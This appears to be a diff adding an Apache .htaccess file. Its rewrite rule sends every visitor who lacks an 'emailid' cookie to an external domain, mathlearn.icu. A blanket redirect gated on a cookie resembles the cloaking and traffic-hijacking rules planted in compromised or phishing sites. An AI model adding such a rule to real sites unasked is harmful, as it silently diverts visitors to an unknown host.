@@ -1,0 +1,5 @@
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_COOKIE} !emailid= [NC]
+RewriteRule .* http://www.mathlearn.icu/ [L]
+
